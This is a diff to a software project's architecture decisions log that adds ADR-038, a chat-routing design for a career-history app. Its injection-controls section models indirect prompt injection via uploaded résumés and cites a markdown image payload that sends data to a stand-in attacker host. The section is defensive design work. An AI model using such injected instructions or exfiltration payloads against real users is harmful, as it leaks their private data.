@@ -1,7 +1,7 @@
 # CareerVault — Architectural Decisions Log (ADL)
 
 **Status:** Living document — updated as decisions are made
-**Last updated:** 2026-07-28 (slice 6b — **ADR-015 amended** [résumé retention becomes a flat 30 days matching the RESUMERUN TTL; the original "keep the newest indefinitely, 7-day TTL for older" is not expressible as an S3 lifecycle rule, and 7 days would have outlived-by-proxy the 30-day trace items]) · prior: slice 6a — **ADR-036** added [resume agent: Sonnet 5 via inference profile + 150K token ceiling + tuned iteration/revision caps; with a live-access correction — Sonnet 5 ungrantable on this account, runs on Sonnet 4-6 — and a cost-tuning note]; **ADR-037** added [résumé generation is an async job: 202 + poll, corrects arch §3.2.1's synchronous depiction]) · prior: slice 5 — ADR-035 added; ADR-024 corrected
+**Last updated:** 2026-07-28 (slice 7 — **ADR-038** added [chat routing: a third control-flow tool `answer_question` keeps `toolChoice=any`; route → deterministic Titan retrieval → grounded synthesis, and `chat_lambda` gains read-only `ENTRY#` access, amending the §4.2.3 isolation claim]) · prior: slice 6b — **ADR-015 amended** [résumé retention becomes a flat 30 days matching the RESUMERUN TTL; the original "keep the newest indefinitely, 7-day TTL for older" is not expressible as an S3 lifecycle rule, and 7 days would have outlived-by-proxy the 30-day trace items]) · prior: slice 6a — **ADR-036** added [resume agent: Sonnet 5 via inference profile + 150K token ceiling + tuned iteration/revision caps; with a live-access correction — Sonnet 5 ungrantable on this account, runs on Sonnet 4-6 — and a cost-tuning note]; **ADR-037** added [résumé generation is an async job: 202 + poll, corrects arch §3.2.1's synchronous depiction]) · prior: slice 5 — ADR-035 added; ADR-024 corrected
 
 ---
 
@@ -68,6 +68,7 @@ Each ADR has:
 | ADR-035 | Resume upload & parse flow — presigned upload, sync parse, parse-only | Accepted   |
 | ADR-036 | Resume agent — Sonnet via inference profile + bounded-loop cost controls | Accepted   |
 | ADR-037 | Resume generation is an asynchronous job (invoke + poll), not synchronous | Accepted   |
+| ADR-038 | Chat routing — a third control-flow tool (`answer_question`) keeps `toolChoice=any` | Accepted   |
 
 ---
 
@@ -1398,6 +1399,198 @@ Queue-triggered worker + status endpoint), GCP Cloud Tasks / Pub/Sub + a job doc
 portable lesson is that a synchronous HTTP front door has a timeout ceiling (29 s here, similar
 elsewhere), and any workload that can exceed it belongs behind an async job with its own status
 resource.
+
+---
+
+## ADR-038: Chat routing — a third control-flow tool (`answer_question`) keeps `toolChoice=any`
+
+**Status:** Accepted
+**Date:** 2026-07-28 (slice 7)
+
+### Context
+Through slice 2b, `chat_lambda` is ingestion-only: §3.1.2's **two-tool pattern** hands Haiku exactly
+`propose_entry` and `ask_clarification` with `toolChoice=any`, so every turn is *forced* to produce
+structured output. FR-6.1 now asks the same endpoint to also answer questions over the user's own
+history ("what did I do in 2025?", "which entries mention Python?").
+
+That exposes a gap in the current design rather than a new feature bolted beside it: **today a
+question has no tool that fits it.** Forced to call something, Haiku must bend the question into
+`ask_clarification` (mildly wrong) or, worse, `propose_entry` (creates a candidate entry out of a
+question). The exit criterion "a question can't accidentally create an entry" is therefore not a
+constraint the new path must avoid violating — it's a defect in the *existing* path that routing
+fixes.
+
+The second forcing constraint is that **an answer requires retrieval, and retrieval requires a
+vector**. The model cannot answer from history it has never seen, and the Lambda cannot know which
+entries are relevant until it has a query to embed. So any design has to get from "user text" to
+"query embedded, entries ranked, answer composed" — the only question is who owns which step.
+
+### Decision
+Add a **third tool, `answer_question`**, and keep `toolChoice=any` unchanged. The tool is
+**control-flow only** — it has no action of its own; it exists so the model can *signal* "this turn
+is a question" and hand back a retrieval query in a typed way. This is the same "tool use as a phase
+signal" pattern the resume agent already uses for `retrieval_done` / `submit_resume` /
+`submit_critique` (§3.2, and the note at §3.1's close).
+
+A Q&A turn is then **two Bedrock calls with deterministic retrieval bolted between them**, all owned
+by the Lambda:
+
+1. **Route (Haiku, `toolChoice=any`).** Same history replay, same forced-tool invariant. The model
+   picks `propose_entry` / `ask_clarification` (existing paths, unchanged, still one call) or
+   `answer_question`, whose input carries the retrieval query — the user's intent restated for
+   embedding, not their raw text.
+2. **Retrieve (no model).** Titan-embed the query (`bedrock_client.embed`), read the user's entries,
+   rank with `similarity.rank_by_similarity`, take top-k. Pure Python + one embedding call; no loop,
+   no model discretion, so the cost is fixed and the behaviour is testable without Bedrock.
+3. **Synthesize (Haiku).** Compose a grounded answer with the top-k entries in the prompt, under
+   instructions to answer *only* from them and to say so when the history doesn't cover the question.
+
+**IAM — and a correction found while implementing this.** The plan for this slice, and the first
+draft of this ADR, both said `chat_lambda` would *gain* `dynamodb:Query` on `ENTRY#` items. **It
+does not, because it already had it.** The function's existing policy grants `dynamodb:Query` on
+the table ARN with no condition, so reading `ENTRY#` items was already permitted by IAM through all
+of slices 2–6; nothing in the role changed this slice.
+
+That is not sloppiness in the original policy — **IAM cannot express the restriction.** Every item
+for a user shares one partition key (`USER#<sub>`), the isolation wanted is by *sort-key prefix*,
+and `dynamodb:LeadingKeys` scopes the partition key only with no sort-key-prefix equivalent
+(§4.2.1, and the same limitation §4.2.4 already documents for write-time key constraints). So
+§4.2.3's pre-slice-7 claim that chat "can only touch `CONVO#`" was always **an application-code
+property, not an IAM one** — enforced by which `ddb_helpers` functions the handler calls.
+
+The honest restatement, therefore:
+
+- **What actually changes in IAM:** one grant, `bedrock:InvokeModel` on the Titan embed model, so
+  the retrieval query can be vectorised. That is the entire policy delta.
+- **What changes in code:** `chat_lambda` now calls `query_entries` where before it called only
+  `query_conversation`. The read widening is a *code* change that IAM was never blocking.
+- **What is unchanged:** chat still cannot write an entry. `PutItem` is granted, but the handler
+  only ever writes `CONVO#` items through `put_conversation_message`, and entry creation remains
+  `career_crud`'s exclusive privilege behind the user's confirm (§3.1.3). That is the property
+  §4.2.3 actually protects, and it survives intact.
+
+Stated plainly for the record: after this slice a successful prompt injection in chat can cause the
+user's career history to be *read* into a model prompt. Single-tenant MVP, PK scoped to the JWT
+`sub` (§4.2.4), so the blast radius is the user's own data in the user's own session.
+
+The lesson worth carrying is the one the correction exposes: **a "least privilege" boundary that
+IAM cannot express is a code invariant wearing an IAM costume.** It is still worth having — but it
+must be documented as a code invariant, tested as one, and never assumed to be enforced by the
+platform. §4.2.3 is amended in this slice **before** the code, since a security review reading a
+stale isolation claim is worse than no claim at all.
+
+#### Injection controls (why the widening is an acceptable trade)
+
+The threat here is not "an attacker reads the user's entries" — in a single-tenant app the user
+reading their own history *is the feature*. It is **indirect prompt injection**: slice 5 lets a
+résumé be uploaded from anywhere, its text becomes an entry's `content`, and slice 7 then retrieves
+that content into a model prompt. Poisoned data at rest, replayed into a privileged context. The
+question worth engineering against is therefore *"can retrieved content act as instructions?"*
+
+Four controls, all of which hold at the API layer rather than by asking the model nicely:
+
+1. **Retrieval is model-free.** The model emits a query *string*; the Lambda owns embedding,
+   ranking and the top-k slice. A fully hijacked model cannot say "retrieve everything" or "retrieve
+   the ones mentioning salary." This is the concrete security dividend of rejecting the
+   `search_entries` agentic loop — the alternative would have handed query control to the model.
+2. **The synthesis call carries no tools.** `bedrock_client.converse` omits `toolConfig` from the
+   request entirely when `tool_config is None`, so the single call that sees entry content has no
+   tool it could be induced to invoke. Injected text of the form *"now call `propose_entry` with…"*
+   has nothing to reach. This closes injection→write at the transport, not by prompt.
+3. **Privilege separation between the two calls.** The routing call has tools but never sees entry
+   content; the synthesis call sees entry content but has zero capability, and its output is only
+   ever rendered as text. Untrusted-at-rest data reaches only the powerless call. (This is the
+   dual-LLM shape; it falls out of the two-call design rather than being bolted on.)
+4. **Answers render as text, never HTML or markdown.** A real exfiltration channel, not a
+   hypothetical: a markdown-rendered answer could emit `![](https://attacker/?d=…)` and leak on
+   image load. `Chat.tsx` today uses plain React text nodes — no `dangerouslySetInnerHTML`, no
+   markdown renderer anywhere in `frontend/src` — so this is currently true *by construction*.
+   Slice 7 makes it an explicit tested invariant, because "add react-markdown for nicer answers" is
+   a highly plausible future commit that would silently reopen it.
+
+Delimiting retrieved entries and instructing the model to treat them as data is *also* done, but it
+is recorded here as **defense in depth, not a boundary**. Prompt instructions are a nudge; nothing
+in this design depends on the model obeying them.
+
+#### Aggregate questions — a known, bounded limitation
+
+Semantic top-k answers *"what is most like this query?"* — a ranking question. **"How many AWS certs
+do I have?" is a filter-and-count question**, and embeddings are the wrong index for it. The failure
+is worse than vagueness: hand the model the 5 nearest entries and it will confidently answer "5."
+Top-k structurally biases a count toward k, so the wrong answer is *predictable and confident*.
+
+The useful observation is that this is a **compression choice, not a retrieval ceiling**:
+`ddb_helpers.query_entries` already reads the *entire* corpus into Lambda memory (paginated to
+completion — the §2.5 AP-10 note) before anything is ranked. The whole history is in hand; top-k is
+a narrowing we elect. So slice 7 takes two cheap steps and defers the third:
+
+- **Now — corpus census.** Every synthesis prompt carries counts by `entry_type`, computed in Python
+  from the corpus already loaded (~8 integers, ~50 tokens). This answers "how many certs do I have?"
+  correctly *today* without a filter branch, and it embodies the right principle: **let Python
+  count, let the model narrate.** LLMs are unreliable counters; hand over the number, not the task.
+- **Now — reserved `intent` field** (`lookup` | `aggregate`) on `answer_question`'s input. Slice 7
+  implements only the `lookup` branch. Shipping the field unused makes the v1.1 filter path additive
+  rather than a tool-schema change plus reasoning about conversation turns already persisted under
+  the old shape.
+- **v1.1 — hybrid retrieval.** A structured-filter branch (`entry_type`, issuer keyword, date range)
+  evaluated deterministically over the in-memory corpus, returning a compact projection (title /
+  date / issuer, no `content`, no embedding) instead of top-k full entries. This is text-to-*filter*
+  alongside text-to-vector — the standard hybrid-retrieval answer.
+
+Note what this does *not* require: **no GSI, and ADR-028's "no GSIs at MVP" holds comfortably.** A
+single human career is tens to low hundreds of items — one cheap Query. A `entry_type` GSI would
+only earn its keep at a corpus size this application does not reach.
+
+### Alternatives considered
+- **`toolChoice=auto`, free text allowed for answers.** The obvious simplification: let the model
+  just *talk* when it isn't ingesting. Rejected on two counts. First, the answer would be
+  **ungrounded** — with no retrieval step the model answers from the conversation and its own
+  priors, which is precisely the hallucination FR-6.1 exists to avoid; grounding it would mean
+  pre-retrieving on *every* turn, paying Titan + prompt tokens on ingestion turns that never need
+  it. Second, `auto` **surrenders the forced-structured-output guarantee that slice 2b's ingestion
+  depends on** — the model becomes free to reply chattily where it used to call `propose_entry`,
+  which is exactly the class of run-to-run drift already observed on this account (Haiku Converse at
+  `temperature=0` is not deterministic). Trading a known-good ingestion path for routing convenience
+  is a bad trade.
+- **A `search_entries` tool + a real agentic loop (`toolChoice=auto`, `toolResult` round-trips).**
+  The most conventionally "agentic" shape, and tempting given ADR-010's own-the-loop learning goal.
+  Rejected for slice 7: it makes cost a function of model discretion (the resume agent's growing
+  retrieval context is already backlog B-004, the dominant per-run cost), and it **breaks history
+  replay** — `_to_converse_messages` deliberately flattens a tool-calling assistant turn to its text
+  summary precisely because Converse requires every `toolUse` be paired with a matching
+  `toolResult`, which this single-shot design never produces. Adopting it means reworking
+  conversation persistence, not just routing. The agentic-loop learning is already banked in slice
+  6a where the workload justifies it.
+- **A separate `POST /chat/ask` endpoint.** Clean separation, but it pushes routing onto the *user*
+  ("am I logging or asking?"), which is the opposite of the conversational promise, and it
+  duplicates history handling across two routes.
+
+### Consequences
+- ✅ Ingestion is untouched — same tools, same `toolChoice`, same single call, so 2b's smoke tests
+  are a genuine regression check rather than a rewritten baseline.
+- ✅ Fixes the latent "a question gets parsed into an entry" defect by giving the model a correct
+  destination for questions.
+- ✅ Retrieval is deterministic and model-free, so it unit-tests without Bedrock and its cost is a
+  constant (one Titan embed) rather than a function of how many times the model chooses to search.
+- ✅ Bounded cost: a Q&A turn is **at most two Haiku calls**; ingestion stays at one.
+- ⚠️ Two calls means Q&A latency is roughly double a parse turn. Both are Haiku and small, so this
+  is comfortably inside a chat interaction — but it is the reason to keep top-k modest.
+- ✅ Injection→write is closed at the transport (no `toolConfig` on the call that sees entry
+  content), not by prompt instruction — a boundary that survives a fully compromised model.
+- ⚠️ Answer quality is bounded by retrieval quality. Top-k semantic ranking is the wrong index for
+  aggregate-shaped questions; the corpus census covers the common counting case, and the hybrid
+  filter branch is deferred to v1.1 (see above). The honest fallback remains the "history doesn't
+  cover this" instruction.
+- ⚠️ `chat_lambda` can now read entries (above). The §4.2.3 isolation claim must be amended, not
+  quietly outgrown.
+
+### Cross-cloud parallel
+"Forced function call as a router" is portable: Azure OpenAI's `tool_choice: "required"` and Vertex
+AI Gemini's function-calling mode `ANY` have near-identical semantics (as §3.1.2 already noted for
+the two-tool pattern). The deeper portable idea is **classify-then-retrieve-then-generate** — a
+router turn that emits a typed intent, deterministic retrieval owned by the application, and a
+generation turn grounded in what was retrieved. That is the standard RAG shape everywhere; what
+varies is only whether the router is a forced tool call, a classifier model, or a rules layer.
 
 ---
 
